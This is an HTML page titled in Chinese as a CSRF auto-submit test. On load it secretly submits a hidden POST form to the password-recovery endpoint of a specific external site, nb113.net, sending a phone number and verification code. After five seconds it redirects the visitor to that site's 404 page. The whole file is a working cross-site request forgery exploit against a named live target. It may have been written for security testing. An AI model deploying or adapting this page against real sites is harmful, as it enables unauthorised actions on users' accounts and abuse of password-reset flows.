<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>CSRF 自动提交测试</title>
</head>
<body>

  <!-- ✅ 表单自动提交（带 POST 数据） -->
  <form id="csrfForm" method="POST" action="https://nb113.net/index.php?s=/ForgetPage/formRemeber" target="resultFrame">
    <input type="hidden" name="phone" value="0976261367">
    <input type="hidden" name="checkword" value="12345">
    <input type="hidden" name="btnok" value="">
  </form>

  <!-- ✅ iframe 不隐藏，用于显示提交响应结果 -->
  <iframe name="resultFrame" width="100%" height="600px" style="border: 1px solid #ccc;"></iframe>

  <p>⏳ 正在提交，请稍候…</p>

  <script>
    window.onload = () => {
      // 自动提交表单
      document.getElementById("csrfForm").submit();

      // 5 秒后无条件跳转 404 页面（无论结果如何）
      setTimeout(() => {
        window.location.href = "https://nb113.net/404.html";
      }, 5000);
    };
  </script>

</body>
</html>
